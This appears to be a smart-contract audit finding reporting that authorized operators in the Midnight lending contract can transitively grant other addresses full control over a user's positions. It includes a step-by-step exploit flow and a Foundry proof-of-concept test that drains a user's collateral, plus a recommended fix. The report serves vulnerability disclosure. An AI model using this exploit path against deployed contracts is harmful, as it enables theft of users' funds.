### Title
Authorized Operator Can Transitively Delegate Full Authorization to Arbitrary Addresses Without User Consent - (File: src/Midnight.sol)

### Summary
`setIsAuthorized` in `src/Midnight.sol` permits any address that is already authorized for a user to call `setIsAuthorized(attacker, true, user)` on that user's behalf. Because the only guard is `onBehalf == msg.sender || isAuthorized[onBehalf][msg.sender]`, a compromised or malicious operator can silently grant a secondary attacker full authorization over the user's positions. The secondary attacker can then call `withdrawCollateral`, `withdraw`, `take`, or any other `onBehalf`-gated function against the user.

### Finding Description
**Root cause — `src/Midnight.sol` lines 731–734:**

```solidity
function setIsAuthorized(address authorized, bool newIsAuthorized, address onBehalf) external {
    require(onBehalf == msg.sender || isAuthorized[onBehalf][msg.sender], Unauthorized());
    isAuthorized[onBehalf][authorized] = newIsAuthorized;
    ...
}
``` [1](#0-0) 

The guard accepts `isAuthorized[onBehalf][msg.sender]` as sufficient to write any new entry into `isAuthorized[onBehalf][*]`. There is no restriction that only the account itself (`onBehalf == msg.sender`) may expand its own authorization set.

**Exploit flow:**

1. `user` calls `setIsAuthorized(operator, true, user)` — legitimate, `isAuthorized[user][operator] = true`.
2. `operator` (attacker-controlled, or a compromised contract) calls `setIsAuthorized(secondaryAttacker, true, user)`. The check `isAuthorized[user][operator]` is `true`, so it passes. Now `isAuthorized[user][secondaryAttacker] = true`.
3. `secondaryAttacker` calls `withdrawCollateral(market, collateralIndex, assets, user, secondaryAttacker)`. The check at line 556 — `onBehalf == msg.sender || isAuthorized[onBehalf][msg.sender]` — passes because `isAuthorized[user][secondaryAttacker]` is `true`. [2](#0-1) 

4. Alternatively, `secondaryAttacker` calls `take(offer, ..., units, user, ...)`. The check at line 346 — `taker == msg.sender || isAuthorized[taker][msg.sender]` — passes, forcing `user` to take on debt as seller. [3](#0-2) 

**Existing checks are insufficient.** The Certora spec `onlyAuthorizedCanChangeIsAuthorized` explicitly encodes this behavior as acceptable:

```
bool authorizerIsAuthorized = authorizer == e.msg.sender || isAuthorized(authorizer, e.msg.sender);
assert isAuthorizedAfter == isAuthorizedBefore || authorizerIsAuthorized;
``` [4](#0-3) 

The spec treats an authorized operator as having the same power as the user themselves, so the formal verification does not catch this as a violation. The existing test `testSetIsAuthorizedAuthorization` in `test/AuthorizationTest.sol` lines 290–303 **confirms** the transitive delegation succeeds and asserts it as correct behavior — but this is precisely the attack path. [5](#0-4) 

### Impact Explanation
Any address authorized by a user can silently add an unlimited number of additional addresses with full control over that user's positions. Each newly added address can itself add more addresses. A single compromised or malicious operator (e.g., a bundler contract, a ratifier, or any contract the user authorized) can drain all of the user's collateral, force the user into debt via `take`, cancel the user's offers via `setConsumed`, or further delegate to an unbounded attacker chain — all without any further action from the user.

### Likelihood Explanation
**Preconditions:** The user must have authorized at least one address (operator). This is the normal operating condition for any user interacting via a bundler (`MidnightBundles`), an `EcrecoverAuthorizer`, or any smart-contract wrapper. The operator need not be malicious at authorization time; it only needs to be compromised or have a re-entrancy/callback surface later. The attack is a single additional `setIsAuthorized` call, costs only gas, and is repeatable for every user who has ever granted authorization. [6](#0-5) 

### Recommendation
Restrict `setIsAuthorized` so that only the account itself can expand its own authorization set. Authorized operators should be able to act *on behalf of* the user but not *rewrite* the user's authorization registry:

```solidity
function setIsAuthorized(address authorized, bool newIsAuthorized, address onBehalf) external {
    require(onBehalf == msg.sender, Unauthorized()); // only self
    isAuthorized[onBehalf][authorized] = newIsAuthorized;
    ...
}
```

If delegated authorization management is intentionally desired, introduce a separate, explicitly scoped permission bit (e.g., `canDelegate`) that users must opt into separately, so the scope of trust is explicit.

### Proof of Concept
**Foundry unit test plan** (extend `AuthorizationTest`):

```solidity
function testTransitiveDelegationDrainsCollateral() public {
    address user     = makeAddr("user");
    address operator = makeAddr("operator");   // user trusts this
    address attacker = makeAddr("attacker");   // user never authorized this

    uint256 collateralAmount = 1000;
    address collateralToken  = market.collateralParams[0].token;

    // Setup: user deposits collateral
    deal(collateralToken, user, collateralAmount);
    vm.prank(user); ERC20(collateralToken).approve(address(midnight), collateralAmount);
    vm.prank(user); midnight.supplyCollateral(market, 0, collateralAmount, user);

    // Step 1: user authorizes operator (legitimate)
    vm.prank(user);
    midnight.setIsAuthorized(operator, true, user);

    // Step 2: operator silently delegates to attacker
    vm.prank(operator);
    midnight.setIsAuthorized(attacker, true, user);

    // Assert: attacker is now authorized for user without user's consent
    assertEq(midnight.isAuthorized(user, attacker), true);

    // Step 3: attacker drains user's collateral
    vm.prank(attacker);
    midnight.withdrawCollateral(market, 0, collateralAmount, user, attacker);

    // Assertions
    assertEq(ERC20(collateralToken).balanceOf(attacker), collateralAmount);
    assertEq(midnight.collateral(toId(market), user, 0), 0);
}
```

Expected: test passes (no revert), demonstrating the full exploit. The `assertEq(midnight.isAuthorized(user, attacker), true)` line confirms the transitive delegation, and the final balance assertions confirm the collateral drain.
